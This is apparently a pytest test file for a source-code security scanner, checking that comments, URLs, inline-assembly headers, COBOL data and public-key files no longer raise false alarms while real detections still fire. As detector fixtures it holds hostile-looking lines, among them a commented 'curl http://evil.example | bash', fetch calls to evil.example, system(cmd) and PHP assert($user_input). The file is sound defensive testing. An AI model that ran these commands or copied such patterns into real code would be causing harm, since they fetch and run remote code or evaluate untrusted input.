"""#4548 item 1: SARIF false errors from the security lens on C/C++ projects (Doom study).

One mechanism: the lens ran its code-behaviour regexes over the raw buffer -- comments, prose and
data files included -- with no language awareness, and recorded no column. One fixture per member.
"""

import json

import pytest

from gitgalaxy.core.aperture import ApertureFilter
from gitgalaxy.core.prism import Prism
from gitgalaxy.recorders.sarif_recorder import SarifRecorder
from gitgalaxy.security.security_lens import SecurityLens
from gitgalaxy.standards.gitgalaxy_config import APERTURE_CONFIG, LEXICAL_FAMILY_HEURISTICS
from gitgalaxy.standards.language_standards import LANGUAGE_DEFINITIONS

PRISM = Prism(LEXICAL_FAMILY_HEURISTICS, LANGUAGE_DEFINITIONS)


@pytest.fixture(scope="module")
def lens():
    return SecurityLens()


def _scan(lens, text, lang="c", prose=False):
    code = PRISM.split_streams(text, lang)["code_stream"] if not prose else None
    return lens.scan_content(text, code_stream=code, prose=prose)


GPL = (
    "// You should have received a copy of the GNU General Public License\n"
    "// along with this program.  If not, see <http://www.gnu.org/licenses/>.\n"
    "int x;\n"
)


def test_gpl_boilerplate_is_not_dead_code(lens):
    assert _scan(lens, GPL)["counts"]["dead_code"] == 0


def test_comment_url_is_not_dead_code_but_commented_out_call_is(lens):
    assert _scan(lens, "int x;\n// see http://doomwiki.org/Linedef\n")["counts"]["dead_code"] == 0
    assert _scan(lens, "/* http://example.org/a */ int x;\n")["counts"]["dead_code"] == 0
    # genuine commented-out logic still fires
    assert _scan(lens, '// fetch("http://evil.example/x");\n')["counts"]["dead_code"] == 1
    assert _scan(lens, "// curl http://evil.example | bash\n")["counts"]["dead_code"] > 0


@pytest.mark.parametrize(
    "comment",
    [
        "// Ken Silverman's official web site: \"http://www.advsys.net/ken\"",
        "// Project page: 'http://example.org/page'",
        "/* Home page: \"http://example.org/\" */ int x;",
    ],
)
def test_quoted_url_after_prose_is_not_dead_code(lens, comment):
    assert _scan(lens, f"int x;\n{comment}\n")["counts"]["dead_code"] == 0


@pytest.mark.parametrize(
    "logic",
    ['// url = "http://evil.example/x";', "// get('http://evil.example/x')", "// hosts = [\"http://evil.example\"]"],
)
def test_commented_out_url_argument_is_still_dead_code(lens, logic):
    assert _scan(lens, f"int x;\n{logic}\n")["counts"]["dead_code"] == 1


INLINE_ASM_MACRO_HEADER = """\
// Ken Silverman's official web site: "http://www.advsys.net/ken"
#ifndef BASICINLINES_H
#define BASICINLINES_H
#define clearbuf(d, c, v) __asm__ __volatile__("rep stosl" : "=&D"(d), "=&c"(c) : "0"(d), "1"(c), "a"(v) : "memory", "cc")
#define mulscale(a, b, c) ({ int r; __asm__("imull %%edx\\n\\tshrdl %%cl,%%edx,%%eax" : "=a"(r) : "a"(a), "d"(b), "c"(c) : "cc"); r; })
#define sqr(a) ((a) << 2 | (a) >> 3 ^ 0xff)
#endif
"""


def test_inline_asm_macro_header_carries_no_threat_signal(lens):
    """#4548: the class is a header of inline-asm macros (Build engine `basicinlines.h`); none of
    its constructs is a threat, so the Packed Payload Guard must not quarantine it."""
    counts = _scan(lens, INLINE_ASM_MACRO_HEADER)["counts"]
    assert not {k: v for k, v in counts.items() if v}


def test_c_assert_is_not_remote_code_execution(lens):
    c = 'void f(int x) {\n  assert(x > 0);\n  ASSERT (x);\n  assert(!"unreachable");\n}\n'
    assert _scan(lens, c)["counts"]["high_risk_execution"] == 0
    # PHP's assert() evaluates a string: still a vector
    assert (
        _scan(lens, "<?php\nassert($user_input);\nassert('strlen($x)');\n", lang="php")["counts"]["high_risk_execution"]
        == 2
    )


def test_execution_in_a_comment_is_not_execution(lens):
    assert _scan(lens, "// system(cmd);\nint x;\n")["counts"]["high_risk_execution"] == 0
    assert _scan(lens, "int x;\nsystem(cmd);\n")["counts"]["high_risk_execution"] == 1


def test_changelog_prose_is_not_a_cobol_secret(lens):
    log = '- Added keyword value "acs" to the ACS parser\n'
    assert _scan(lens, log, prose=True)["counts"]["hardcoded_secrets"] == 0
    # real COBOL data items still match, with or without a hyphenated prefix
    cob = "       05 WS-PASSWORD   PIC X(8) VALUE 'hunter22'.\n       05 TOKEN-VAL VALUE 'abc'.\n"
    assert _scan(lens, cob, lang="cobol")["counts"]["hardcoded_secrets"] == 2


@pytest.mark.parametrize("level", ["1", "01", "05", "77"])
def test_cobol_level_numbers_one_and_two_digits(lens, level):
    cob = f"       {level} WS-PASSWORD   PIC X(8) VALUE 'hunter22'.\n"
    assert _scan(lens, cob, lang="cobol")["counts"]["hardcoded_secrets"] == 1


def test_credential_in_prose_still_found(lens):
    assert _scan(lens, 'password = "abcdefghijklmnop1234"\n', prose=True)["counts"]["hardcoded_secrets"] == 1


def test_mapinfo_include_is_not_a_shadow_import(lens):
    mapinfo = 'include "mapinfo/common.txt"\n'
    assert _scan(lens, mapinfo, prose=True)["counts"]["shadow_imports"] == 0
    # a real include of a payload in code still fires; the same text in a comment does not
    assert _scan(lens, '<?php\ninclude "payload.png";\n', lang="php")["counts"]["shadow_imports"] == 1
    assert _scan(lens, '// include "payload.png";\n', lang="c")["counts"]["shadow_imports"] == 0


def test_sites_carry_the_original_line_and_column(lens):
    long_line = "int a; " + "x" * 300 + "\n"  # dropped by the 250-char armor, must still count as line 1
    text = long_line + "int y;\n    system(cmd);\n"
    r = _scan(lens, text)
    assert r["snippets"]["high_risk_execution"] == ["system("]
    assert r["sites"]["high_risk_execution"] == [[3, 5]]
    assert r["positions"]["high_risk_execution"] == [3]


def test_sarif_reports_the_real_column(tmp_path):
    node = {
        "path": "src/a.c",
        "telemetry": {
            "threat_snippets": {"high_risk_execution": ["system("], "dead_code": ["// curl x"]},
            "threat_sites": {"high_risk_execution": [[3, 5]], "dead_code": [None]},
        },
    }
    out = tmp_path / "o.sarif"
    SarifRecorder().generate_report([node], {}, {}, str(out))
    by_rule = {
        r["ruleId"]: r["locations"][0]["physicalLocation"]["region"]
        for r in json.loads(out.read_text())["runs"][0]["results"]
    }
    assert by_rule["GG-SAST-HIGH_RISK_EXECUTION"] == {"startLine": 3, "startColumn": 5}
    # no recorded column: do not invent column 1
    assert "startColumn" not in by_rule["GG-SAST-DEAD_CODE"]


@pytest.mark.parametrize(
    ("name", "text", "leak"),
    [
        ("llvm-snapshot.gpg.key", "-----BEGIN PGP PUBLIC KEY BLOCK-----\n\nmQINBFE9\n", False),
        ("site.crt", "-----BEGIN CERTIFICATE-----\nMIIB\n", False),
        ("a.pem", "-----BEGIN PUBLIC KEY-----\nMFww\n", False),
        ("a.pem", "-----BEGIN RSA PRIVATE KEY-----\nMIIE\n", True),
        ("a.key", "-----BEGIN PGP PUBLIC KEY BLOCK-----\n-----BEGIN PGP PRIVATE KEY BLOCK-----\n", True),
        ("a.key", "no armor at all\n", True),
        ("id_rsa", "-----BEGIN PUBLIC KEY-----\n", True),
    ],
)
def test_public_key_material_is_not_a_leaked_credential(tmp_path, name, text, leak):
    f = tmp_path / name
    f.write_text(text, encoding="utf-8")
    eng = ApertureFilter(root_dir=tmp_path, language_definitions=LANGUAGE_DEFINITIONS, aperture_config=APERTURE_CONFIG)
    _, _, reason = eng.evaluate_path_integrity(f)
    assert ("CRITICAL LEAK" in reason) is leak
